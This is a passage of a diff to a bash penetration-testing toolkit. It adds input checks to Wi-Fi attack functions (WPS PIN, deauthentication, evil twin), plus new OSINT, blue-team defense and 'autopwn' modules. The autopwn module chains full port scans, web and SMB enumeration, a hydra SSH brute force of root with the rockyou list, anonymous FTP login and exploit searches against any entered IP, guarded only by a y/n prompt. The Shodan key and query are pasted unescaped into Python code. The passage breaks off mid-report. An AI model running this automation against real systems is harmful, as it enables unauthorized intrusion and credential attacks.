+    [[ -z "$target_bssid" ]] && return
     
     echo -e "${YELLOW}[*] Starting WPS PIN attack...${NC}"
     echo -e "${YELLOW}[*] This may take several hours${NC}"
@@ -1940,9 +2185,12 @@ deauth_attack() {
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
     [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    [[ -z "$iface" ]] && return
     
     echo -n "Enter target BSSID (AP): "
     read target_bssid
+    [[ -z "$target_bssid" ]] && return
+    
     echo -n "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): "
     read client_mac
     client_mac=${client_mac:-FF:FF:FF:FF:FF:FF}
@@ -1970,6 +2218,8 @@ evil_twin() {
     echo -e "${BLUE}[*] Evil Twin Access Point${NC}"
     echo -n "Enter interface for AP (e.g., wlan0): "
     read ap_iface
+    [[ -z "$ap_iface" ]] && return
+    
     echo -n "Enter SSID name: "
     read ssid_name
     echo -n "Enter channel (1-14): "
@@ -2043,6 +2293,7 @@ monitor_mode_menu() {
     echo "1) Enable monitor mode"
     echo "2) Disable monitor mode"
     echo "3) Change MAC address"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read mon_choice
     
@@ -2050,6 +2301,7 @@ monitor_mode_menu() {
         1)
             echo -n "Enter interface: "
             read iface
+            [[ -z "$iface" ]] && return
             echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
             airmon-ng check kill 2>/dev/null
             airmon-ng start "$iface"
@@ -2057,6 +2309,7 @@ monitor_mode_menu() {
         2)
             echo -n "Enter interface (e.g., wlan0mon): "
             read iface
+            [[ -z "$iface" ]] && return
             echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
             airmon-ng stop "$iface"
             service NetworkManager restart 2>/dev/null || service networking restart 2>/dev/null
@@ -2064,6 +2317,7 @@ monitor_mode_menu() {
         3)
             echo -n "Enter interface: "
             read iface
+            [[ -z "$iface" ]] && return
             echo -n "Enter new MAC (or 'random'): "
             read new_mac
             
@@ -2080,6 +2334,1130 @@ monitor_mode_menu() {
 }
 
 # =============================================================================
+# OSINT MODULE
+# =============================================================================
+
+osint_menu() {
+    while true; do
+        echo -e "${CYAN}"
+        cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║              OSINT & RECONNAISSANCE                       ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+        echo -e "${NC}"
+        
+        echo "1) Domain Information Gathering"
+        echo "2) Email OSINT (theHarvester)"
+        echo "3) Social Media Reconnaissance"
+        echo "4) Metadata Extraction"
+        echo "5) Shodan Search"
+        echo "6) DNS Enumeration"
+        echo "7) WHOIS Lookup"
+        echo "8) Full OSINT Report (All Tools)"
+        echo "0) Back to Main Menu"
+        echo ""
+        echo -n "Select option: "
+        read osint_choice
+        
+        case $osint_choice in
+            1) domain_osint ;;
+            2) email_osint ;;
+            3) social_media_recon ;;
+            4) metadata_extraction ;;
+            5) shodan_search ;;
+            6) dns_enum_osint ;;
+            7) whois_lookup ;;
+            8) full_osint_report ;;
+            0) break ;;
+            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+domain_osint() {
+    echo -e "${BLUE}[*] Domain Information Gathering${NC}"
+    echo -n "Enter domain: "
+    read domain
+    
+    [[ -z "$domain" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_dir="$OSINT_DIR/domain_$domain_$timestamp"
+    create_dir "$output_dir"
+    
+    echo -e "${YELLOW}[*] Gathering domain information...${NC}"
+    
+    # DNS records
+    echo "=== DNS Records ===" > "$output_dir/dns_records.txt"
+    for record in A AAAA MX NS TXT SOA; do
+        echo "--- $record Records ---" >> "$output_dir/dns_records.txt"
+        host -t "$record" "$domain" >> "$output_dir/dns_records.txt" 2>&1 || true
+    done
+    
+    # Subdomain enumeration
+    echo -e "${YELLOW}[*] Enumerating subdomains...${NC}"
+    echo "=== Subdomains ===" > "$output_dir/subdomains.txt"
+    for sub in www mail ftp admin portal api dev test staging shop blog vpn remote; do
+        host "$sub.$domain" >> "$output_dir/subdomains.txt" 2>&1 &
+    done
+    wait
+    
+    # Certificate transparency
+    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
+        jq -r '.[].name_value' 2>/dev/null | sort -u >> "$output_dir/subdomains.txt" || true
+    
+    # IP lookup
+    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
+    echo "=== IP Information ===" > "$output_dir/ip_info.txt"
+    echo "Domain: $domain" >> "$output_dir/ip_info.txt"
+    echo "IP: $ip" >> "$output_dir/ip_info.txt"
+    [[ -n "$ip" ]] && whois "$ip" >> "$output_dir/ip_info.txt" 2>&1 || true
+    
+    echo -e "${GREEN}[+] Domain OSINT complete. Results saved to: $output_dir${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+email_osint() {
+    check_install theharvester
+    echo -e "${BLUE}[*] Email OSINT (theHarvester)${NC}"
+    echo -n "Enter domain to search: "
+    read domain
+    
+    [[ -z "$domain" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/emails_${domain}_$timestamp.txt"
+    
+    echo -e "${YELLOW}[*] Searching for emails...${NC}"
+    theharvester -d "$domain" -b all -f "$output_file" 2>&1 | tail -50
+    
+    echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+social_media_recon() {
+    echo -e "${BLUE}[*] Social Media Reconnaissance${NC}"
+    echo -n "Enter username to search: "
+    read username
+    
+    [[ -z "$username" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/social_${username}_$timestamp.txt"
+    
+    echo -e "${YELLOW}[*] Searching for username: $username${NC}"
+    
+    # Check various platforms
+    echo "=== Social Media Recon for: $username ===" > "$output_file"
+    echo "Generated: $(date)" >> "$output_file"
+    echo "" >> "$output_file"
+    
+    local platforms=(
+        "https://twitter.com/$username"
+        "https://instagram.com/$username"
+        "https://facebook.com/$username"
+        "https://linkedin.com/in/$username"
+        "https://github.com/$username"
+        "https://reddit.com/user/$username"
+        "https://tiktok.com/@$username"
+        "https://youtube.com/user/$username"
+    )
+    
+    for url in "${platforms[@]}"; do
+        echo "Checking: $url" >> "$output_file"
+        local status=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
+        if [[ "$status" == "200" ]]; then
+            echo "[+] Found: $url" | tee -a "$output_file"
+        else
+            echo "[-] Status: $status" >> "$output_file"
+        fi
+        sleep 1
+    done
+    
+    echo -e "${GREEN}[+] Social media recon complete. Results saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+metadata_extraction() {
+    check_install exiftool
+    echo -e "${BLUE}[*] Metadata Extraction${NC}"
+    echo -n "Enter file or directory path: "
+    read filepath
+    
+    [[ -z "$filepath" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/metadata_$timestamp.txt"
+    
+    if [[ -f "$filepath" ]]; then
+        exiftool "$filepath" | tee "$output_file"
+    elif [[ -d "$filepath" ]]; then
+        find "$filepath" -type f -exec exiftool {} \; | tee "$output_file"
+    else
+        echo -e "${RED}[!] Path not found${NC}"
+        return
+    fi
+    
+    echo -e "${GREEN}[+] Metadata saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+shodan_search() {
+    echo -e "${BLUE}[*] Shodan Search${NC}"
+    
+    if ! python3 -c "import shodan" 2>/dev/null; then
+        echo -e "${YELLOW}[!] Shodan module not installed. Installing...${NC}"
+        pip3 install shodan 2>/dev/null || pip3 install --break-system-packages shodan 2>/dev/null
+    fi
+    
+    echo -n "Enter Shodan API key: "
+    read -s shodan_key
+    echo ""
+    echo -n "Enter search query: "
+    read query
+    
+    [[ -z "$query" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/shodan_$timestamp.txt"
+    
+    echo -e "${YELLOW}[*] Searching Shodan...${NC}"
+    python3 << EOF | tee "$output_file"
+import shodan
+try:
+    api = shodan.Shodan('$shodan_key')
+    results = api.search('$query')
+    print(f"Total results: {results['total']}")
+    for result in results['matches'][:10]:
+        print(f"IP: {result['ip_str']}")
+        print(f"Port: {result['port']}")
+        print(f"Org: {result.get('org', 'n/a')}")
+        print(f"Data: {result['data'][:200]}...")
+        print("-" * 40)
+except Exception as e:
+    print(f"Error: {e}")
+EOF
+
+    echo -e "${GREEN}[+] Shodan results saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+dns_enum_osint() {
+    echo -e "${BLUE}[*] DNS Enumeration${NC}"
+    echo -n "Enter domain: "
+    read domain
+    
+    [[ -z "$domain" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/dns_${domain}_$timestamp.txt"
+    
+    echo "=== DNS Enumeration for $domain ===" | tee "$output_file"
+    echo "" | tee -a "$output_file"
+    
+    # NS lookup
+    echo "--- Name Servers ---" | tee -a "$output_file"
+    host -t ns "$domain" | tee -a "$output_file"
+    
+    # MX lookup
+    echo "" | tee -a "$output_file"
+    echo "--- Mail Servers ---" | tee -a "$output_file"
+    host -t mx "$domain" | tee -a "$output_file"
+    
+    # Zone transfer attempt
+    echo "" | tee -a "$output_file"
+    echo "--- Zone Transfer Attempt ---" | tee -a "$output_file"
+    for ns in $(host -t ns "$domain" | awk '{print $4}'); do
+        echo "Trying $ns:" | tee -a "$output_file"
+        host -l "$domain" "$ns" 2>&1 | tee -a "$output_file" || true
+    done
+    
+    echo -e "${GREEN}[+] DNS enumeration saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+whois_lookup() {
+    echo -e "${BLUE}[*] WHOIS Lookup${NC}"
+    echo -n "Enter domain or IP: "
+    read target
+    
+    [[ -z "$target" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_file="$OSINT_DIR/whois_${target}_$timestamp.txt"
+    
+    whois "$target" | tee "$output_file"
+    
+    echo -e "${GREEN}[+] WHOIS saved to: $output_file${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+full_osint_report() {
+    echo -e "${BLUE}[*] Full OSINT Report${NC}"
+    echo -n "Enter target domain: "
+    read domain
+    
+    [[ -z "$domain" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local report_dir="$OSINT_DIR/full_report_${domain}_$timestamp"
+    create_dir "$report_dir"
+    
+    echo -e "${YELLOW}[*] Running comprehensive OSINT... This may take a few minutes.${NC}"
+    
+    # Domain info
+    echo "[1/6] Gathering domain information..."
+    host "$domain" > "$report_dir/dns_basic.txt" 2>&1
+    host -t mx "$domain" >> "$report_dir/dns_basic.txt" 2>&1
+    host -t ns "$domain" >> "$report_dir/dns_basic.txt" 2>&1
+    whois "$domain" > "$report_dir/whois.txt" 2>&1
+    
+    # Subdomains
+    echo "[2/6] Enumerating subdomains..."
+    for sub in www mail ftp admin portal api dev test staging shop blog vpn remote mobile; do
+        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
+    done
+    wait
+    
+    # Certificate transparency
+    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
+        jq -r '.[].name_value' 2>/dev/null | sort -u > "$report_dir/cert_transparency.txt" || true
+    
+    # Email harvesting
+    echo "[3/6] Searching for emails..."
+    if command -v theharvester &>/dev/null; then
+        theharvester -d "$domain" -b google,linkedin,yahoo 2>/dev/null | tail -100 > "$report_dir/emails.txt" || true
+    fi
+    
+    # Web technologies
+    echo "[4/6] Identifying web technologies..."
+    curl -s -I "http://$domain" > "$report_dir/web_headers.txt" 2>&1 || true
+    
+    # IP info
+    echo "[5/6] Gathering IP information..."
+    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
+    [[ -n "$ip" ]] && whois "$ip" > "$report_dir/ip_whois.txt" 2>&1 || true
+    
+    # Generate summary report
+    echo "[6/6] Generating summary..."
+    cat > "$report_dir/SUMMARY.txt" << EOF
+OSINT Report for: $domain
+Generated: $(date)
+Report ID: $timestamp
+
+=== Files in this report ===
+- dns_basic.txt: DNS A, MX, NS records
+- whois.txt: WHOIS information for domain
+- subdomains.txt: Discovered subdomains
+- cert_transparency.txt: Certificate transparency logs
+- emails.txt: Harvested email addresses
+- web_headers.txt: HTTP headers
+- ip_whois.txt: WHOIS for IP address
+
+=== Quick Stats ===
+EOF
+
+    local subdomain_count=$(grep -c "has address" "$report_dir/subdomains.txt" 2>/dev/null || echo "0")
+    local email_count=$(grep -c "@" "$report_dir/emails.txt" 2>/dev/null || echo "0")
+    
+    echo "Subdomains found: $subdomain_count" >> "$report_dir/SUMMARY.txt"
+    echo "Emails found: $email_count" >> "$report_dir/SUMMARY.txt"
+    echo "IP Address: $ip" >> "$report_dir/SUMMARY.txt"
+    
+    echo -e "${GREEN}[+] Full OSINT report complete: $report_dir${NC}"
+    cat "$report_dir/SUMMARY.txt"
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# BLUETEAM MODULE
+# =============================================================================
+
+blueteam_menu() {
+    while true; do
+        echo -e "${CYAN}"
+        cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║              BLUE TEAM & DEFENSE                          ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+        echo -e "${NC}"
+        
+        echo "1) Secure Password Generator"
+        echo "2) Virus Scan (ClamAV)"
+        echo "3) Rootkit Detection (rkhunter/chkrootkit)"
+        echo "4) File Integrity Check"
+        echo "5) Network Connection Monitor"
+        echo "6) System Hardening Check"
+        echo "0) Back to Main Menu"
+        echo ""
+        echo -n "Select option: "
+        read bt_choice
+        
+        case $bt_choice in
+            1) secure_password_gen ;;
+            2) virus_scan ;;
+            3) rootkit_detection ;;
+            4) file_integrity_check ;;
+            5) network_monitor ;;
+            6) hardening_check ;;
+            0) break ;;
+            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+secure_password_gen() {
+    echo -e "${BLUE}[*] Secure Password Generator${NC}"
+    
+    echo "1) Generate single password"
+    echo "2) Generate multiple passwords"
+    echo "3) Generate passphrase (diceware style)"
+    echo "4) Check password strength"
+    echo "0) Back to main menu"
+    echo -n "Choice: "
+    read choice
+    
+    [[ "$choice" == "0" ]] && return
+    
+    case $choice in
+        1)
+            echo -n "Enter password length (default 16): "
+            read length
+            length=${length:-16}
+            
+            # Generate secure password
+            local password=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
+            echo -e "${GREEN}[+] Generated Password: $password${NC}"
+            
+            echo -n "Save to file? (y/n): "
+            read save
+            [[ "$save" == "y" ]] && echo "$password" >> "$RESULTS_DIR/blueteam/generated_passwords.txt" && \
+                echo -e "${GREEN}[+] Saved to generated_passwords.txt${NC}"
+            ;;
+        2)
+            echo -n "How many passwords? "
+            read count
+            echo -n "Password length? "
+            read length
+            length=${length:-16}
+            
+            timestamp=$(date +%Y%m%d_%H%M%S)
+            local output_file="$RESULTS_DIR/blueteam/passwords_$timestamp.txt"
+            
+            echo "Generated Passwords ($(date))" > "$output_file"
+            echo "============================" >> "$output_file"
+            
+            for i in $(seq 1 "$count"); do
+                local pwd=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
+                echo "$i) $pwd" | tee -a "$output_file"
+            done
+            
+            echo -e "${GREEN}[+] Passwords saved to: $output_file${NC}"
+            ;;
+        3)
+            echo -n "Number of words in passphrase (default 6): "
+            read words
+            words=${words:-6}
+            
+            if [[ -f "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ]]; then
+                local passphrase=$(shuf -n "$words" "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" | tr '\n' '-' | sed 's/-$//')
+                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
+            else
+                # Fallback to random words
+                local passphrase=$(cat /usr/share/dict/words 2>/dev/null | shuf -n "$words" | tr '\n' '-' | sed 's/-$//' || \
+                    openssl rand -base64 32 | tr -dc 'a-z' | fold -w 5 | head -$words | tr '\n' '-' | sed 's/-$//')
+                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
+            fi
+            ;;
+        4)
+            echo -n "Enter password to check: "
+            read -s password
+            echo ""
+            
+            local length=${#password}
+            local score=0
+            
+            [[ $length -ge 12 ]] && ((score+=2))
+            [[ $length -ge 16 ]] && ((score+=2))
+            [[ "$password" =~ [A-Z] ]] && ((score+=1))
+            [[ "$password" =~ [a-z] ]] && ((score+=1))
+            [[ "$password" =~ [0-9] ]] && ((score+=1))
+            [[ "$password" =~ [\!\@\#\$\%\^\&\*] ]] && ((score+=2))
+
+            echo "Length: $length"
+            echo "Score: $score/9"
+            
+            if [[ $score -ge 7 ]]; then
+                echo -e "${GREEN}[+] Strong password${NC}"
+            elif [[ $score -ge 4 ]]; then
+                echo -e "${YELLOW}[~] Moderate password${NC}"
+            else
+                echo -e "${RED}[!] Weak password${NC}"
+            fi
+            ;;
+    esac
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+virus_scan() {
+    check_install clamav clamscan
+    
+    echo -e "${BLUE}[*] Virus Scanner (ClamAV)${NC}"
+    
+    # Update virus database
+    echo -e "${YELLOW}[*] Updating virus database...${NC}"
+    freshclam 2>/dev/null || echo -e "${YELLOW}[!] Could not update database (may need to run freshclam manually)${NC}"
+    
+    echo -n "Enter path to scan (file or directory): "
+    read scan_path
+    
+    [[ -z "$scan_path" ]] && return
+    
+    if [[ ! -e "$scan_path" ]]; then
+        echo -e "${RED}[!] Path not found${NC}"
+        return
+    fi
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local log_file="$RESULTS_DIR/blueteam/virus_scan_$timestamp.log"
+    
+    echo -e "${YELLOW}[*] Scanning...${NC}"
+    
+    if [[ -d "$scan_path" ]]; then
+        clamscan -r --infected --log="$log_file" "$scan_path"
+    else
+        clamscan --infected --log="$log_file" "$scan_path"
+    fi
+    
+    echo -e "${GREEN}[+] Scan complete. Log saved to: $log_file${NC}"
+    
+    # Show summary
+    grep "Infected files:" "$log_file" 2>/dev/null || echo "Scan finished."
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+rootkit_detection() {
+    echo -e "${BLUE}[*] Rootkit Detection${NC}"
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_dir="$RESULTS_DIR/blueteam/rootkit_scan_$timestamp"
+    create_dir "$output_dir"
+    
+    echo "1) Run rkhunter"
+    echo "2) Run chkrootkit"
+    echo "3) Run both"
+    echo "0) Back to main menu"
+    echo -n "Choice: "
+    read choice
+    
+    [[ "$choice" == "0" ]] && return
+    
+    if [[ "$choice" == "1" || "$choice" == "3" ]]; then
+        if command -v rkhunter &>/dev/null; then
+            echo -e "${YELLOW}[*] Running rkhunter...${NC}"
+            rkhunter --check --sk --logfile "$output_dir/rkhunter.log" 2>&1 | tail -100
+        else
+            echo -e "${RED}[!] rkhunter not installed${NC}"
+        fi
+    fi
+    
+    if [[ "$choice" == "2" || "$choice" == "3" ]]; then
+        if command -v chkrootkit &>/dev/null; then
+            echo -e "${YELLOW}[*] Running chkrootkit...${NC}"
+            chkrootkit 2>&1 | tee "$output_dir/chkrootkit.log" | tail -50
+        else
+            echo -e "${RED}[!] chkrootkit not installed${NC}"
+        fi
+    fi
+    
+    echo -e "${GREEN}[+] Rootkit scan complete. Results in: $output_dir${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+file_integrity_check() {
+    echo -e "${BLUE}[*] File Integrity Check${NC}"
+    
+    echo -n "Enter directory to monitor: "
+    read dir_path
+    
+    [[ -z "$dir_path" ]] && return
+    [[ ! -d "$dir_path" ]] && echo -e "${RED}[!] Directory not found${NC}" && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local baseline_file="$RESULTS_DIR/blueteam/baseline_${dir_path//\//_}_$timestamp.txt"
+    local current_file="$RESULTS_DIR/blueteam/current_${dir_path//\//_}_$timestamp.txt"
+    
+    echo "1) Create baseline"
+    echo "2) Check against existing baseline"
+    echo "0) Back to main menu"
+    echo -n "Choice: "
+    read choice
+    
+    [[ "$choice" == "0" ]] && return
+    
+    if [[ "$choice" == "1" ]]; then
+        echo -e "${YELLOW}[*] Creating baseline...${NC}"
+        find "$dir_path" -type f -exec sha256sum {} \; > "$baseline_file" 2>/dev/null
+        echo -e "${GREEN}[+] Baseline saved to: $baseline_file${NC}"
+        echo "Keep this file secure for future integrity checks."
+    elif [[ "$choice" == "2" ]]; then
+        echo -n "Enter baseline file path: "
+        read baseline
+        
+        [[ ! -f "$baseline" ]] && echo -e "${RED}[!] Baseline file not found${NC}" && return
+        
+        echo -e "${YELLOW}[*] Checking integrity...${NC}"
+        find "$dir_path" -type f -exec sha256sum {} \; > "$current_file" 2>/dev/null
+        
+        local diff_output=$(diff "$baseline" "$current_file")
+        
+        if [[ -z "$diff_output" ]]; then
+            echo -e "${GREEN}[+] No changes detected. Integrity verified.${NC}"
+        else
+            echo -e "${RED}[!] CHANGES DETECTED:${NC}"
+            echo "$diff_output"
+            echo ""
+            echo -e "${YELLOW}[*] Added files:${NC}"
+            comm -13 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}')
+            echo ""
+            echo -e "${YELLOW}[*] Modified files:${NC}"
+            comm -12 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}') | while read f; do
+                grep "$f" "$baseline" > /tmp/baseline_hash 2>/dev/null
+                grep "$f" "$current_file" > /tmp/current_hash 2>/dev/null
+                diff /tmp/baseline_hash /tmp/current_hash > /dev/null || echo "$f"
+            done
+        fi
+        
+        rm -f "$current_file"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+network_monitor() {
+    echo -e "${BLUE}[*] Network Connection Monitor${NC}"
+    
+    echo "1) Show active connections"
+    echo "2) Monitor connections in real-time"
+    echo "3) Show listening ports"
+    echo "4) Show established connections"
+    echo "0) Back to main menu"
+    echo -n "Choice: "
+    read choice
+    
+    [[ "$choice" == "0" ]] && return
+    
+    case $choice in
+        1)
+            echo -e "${CYAN}=== Active Connections ===${NC}"
+            netstat -tulpn 2>/dev/null || ss -tulpn
+            ;;
+        2)
+            echo -e "${YELLOW}[*] Monitoring connections (Ctrl+C to stop)...${NC}"
+            watch -n 1 'netstat -tulpn 2>/dev/null || ss -tulpn'
+            ;;
+        3)
+            echo -e "${CYAN}=== Listening Ports ===${NC}"
+            netstat -tlnp 2>/dev/null || ss -tlnp
+            ;;
+        4)
+            echo -e "${CYAN}=== Established Connections ===${NC}"
+            netstat -tnp 2>/dev/null | grep ESTABLISHED || ss -tnp | grep ESTAB
+            ;;
+    esac
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+hardening_check() {
+    echo -e "${BLUE}[*] System Hardening Check${NC}"
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local report_file="$RESULTS_DIR/blueteam/hardening_$timestamp.txt"
+    
+    echo "System Hardening Report - $(date)" | tee "$report_file"
+    echo "================================" | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    
+    # Check SSH settings
+    echo "--- SSH Configuration ---" | tee -a "$report_file"
+    if [[ -f /etc/ssh/sshd_config ]]; then
+        grep -E "^PermitRootLogin|^PasswordAuthentication|^Port" /etc/ssh/sshd_config | tee -a "$report_file"
+    else
+        echo "SSH config not found" | tee -a "$report_file"
+    fi
+    echo "" | tee -a "$report_file"
+    
+    # Check firewall status
+    echo "--- Firewall Status ---" | tee -a "$report_file"
+    ufw status 2>/dev/null | head -5 | tee -a "$report_file" || \
+    iptables -L -n 2>/dev/null | head -10 | tee -a "$report_file" || \
+    echo "No firewall detected" | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    
+    # Check for unnecessary services
+    echo "--- Running Services ---" | tee -a "$report_file"
+    systemctl list-units --type=service --state=running 2>/dev/null | head -20 | tee -a "$report_file" || \
+    service --status-all 2>/dev/null | grep + | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    
+    # Check for SUID files
+    echo "--- SUID Files (potential privilege escalation) ---" | tee -a "$report_file"
+    find / -perm -4000 -type f 2>/dev/null | head -20 | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    
+    # Check for world-writable files
+    echo "--- World-Writable Files ---" | tee -a "$report_file"
+    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    
+    # Check users
+    echo "--- User Accounts ---" | tee -a "$report_file"
+    awk -F: '$3 >= 1000 {print $1}' /etc/passwd | tee -a "$report_file"
+    echo "" | tee -a "$report_file"
+    echo "Users with no password:" | tee -a "$report_file"
+    awk -F: '($2 == "") {print $1}' /etc/shadow 2>/dev/null | tee -a "$report_file" || echo "None found" | tee -a "$report_file"
+    
+    echo "" | tee -a "$report_file"
+    echo "--- Kernel Parameters ---" | tee -a "$report_file"
+    sysctl -a 2>/dev/null | grep -E "rp_filter|syncookies|redirect" | tee -a "$report_file"
+    
+    echo "" | tee -a "$report_file"
+    echo -e "${GREEN}[+] Hardening report saved to: $report_file${NC}"
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# AUTOPWN MODULE
+# =============================================================================
+
+autopwn_menu() {
+    echo -e "${CYAN}"
+    cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║              AUTOPWN - AUTOMATED EXPLOITATION             ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    
+    echo "1) Autopwn IP Address"
+    echo "2) Autopwn URL/Domain"
+    echo "0) Back to Main Menu"
+    echo ""
+    echo -n "Select option: "
+    read choice
+    
+    case $choice in
+        1) autopwn_ip ;;
+        2) autopwn_url ;;
+        0) return ;;
+        *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
+    esac
+}
+
+autopwn_ip() {
+    echo -e "${BLUE}[*] Autopwn IP Address${NC}"
+    echo -n "Enter target IP: "
+    read target_ip
+    
+    [[ -z "$target_ip" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local report_dir="$RESULTS_DIR/autopwn/ip_${target_ip//./_}_$timestamp"
+    create_dir "$report_dir"
+    
+    echo -e "${YELLOW}[*] Starting automated exploitation against $target_ip${NC}"
+    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
+    echo -n "Continue? (y/n): "
+    read confirm
+    [[ "$confirm" != "y" ]] && return
+    
+    # Step 1: Port Scan
+    echo ""
+    echo "[1/6] Running port scan..."
+    nmap -sS -sV -O -p- --open "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null || \
+    nmap -sT -sV -p- --open "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null
+    
+    # Parse open ports
+    local open_ports=$(grep -oP '\d+/open' "$report_dir/nmap_full.nmap" 2>/dev/null | cut -d'/' -f1 | tr '\n' ',')
+    [[ -z "$open_ports" ]] && open_ports="1-65535"
+    
+    echo "Open ports: $open_ports"
+    
+    # Step 2: Service enumeration
+    echo ""
+    echo "[2/6] Running service enumeration..."
+    
+    # Check for web services
+    if grep -q "80/open\|443/open\|8080/open\|8443/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
+        echo "  [*] Web services detected, running web enumeration..."
+        nikto -h "$target_ip" -output "$report_dir/nikto.txt" 2>/dev/null || true
+        
+        # Gobuster if wordlists exist
+        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
+            gobuster dir -u "http://$target_ip" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
+                -o "$report_dir/directories.txt" -t 50 2>/dev/null || true
+        fi
+    fi
+    
+    # Check for SMB
+    if grep -q "445/open\|139/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
+        echo "  [*] SMB detected, running enumeration..."
+        enum4linux-ng -A "$target_ip" -oA "$report_dir/smb_enum" 2>/dev/null || \
+        enum4linux -a "$target_ip" > "$report_dir/smb_enum.txt" 2>/dev/null || true
+    fi
+    
+    # Check for SSH
+    if grep -q "22/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
+        echo "  [*] SSH detected, checking for weak credentials..."
+        hydra -l root -P "$WORDLISTS_DIR/rockyou.txt" "$target_ip" ssh -t 4 -o "$report_dir/ssh_brute.txt" 2>/dev/null || true
+    fi
+    
+    # Check for FTP
+    if grep -q "21/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
+        echo "  [*] FTP detected, checking for anonymous access..."
+        echo "anonymous" | ftp -n "$target_ip" > "$report_dir/ftp_anon.txt" 2>&1 || true
+    fi
+    
+    # Step 3: Vulnerability scan
+    echo ""
+    echo "[3/6] Running vulnerability scan..."
+    if command -v nmap &>/dev/null; then
+        nmap --script vuln -p "$open_ports" "$target_ip" -oN "$report_dir/vuln_scan.txt" 2>/dev/null || true
+    fi
+    
+    # Step 4: Search for exploits
+    echo ""
+    echo "[4/6] Searching for exploits..."
+    local services=$(grep -oP '([a-zA-Z0-9_-]+) [0-9.]+' "$report_dir/nmap_full.nmap" 2>/dev/null | head -10)
+    for service in $services; do
+        searchsploit "$service" 2>/dev/null | head -5 >> "$report_dir/exploits.txt" || true
+    done
+    
+    # Step 5: Generate report
+    echo ""
+    echo "[5/6] Generating report..."
+    cat > "$report_dir/AUTOPWN_REPORT.txt" << EOF
+AUTOPWN REPORT
+==============
+Target: $target_ip
+Date: $(date)
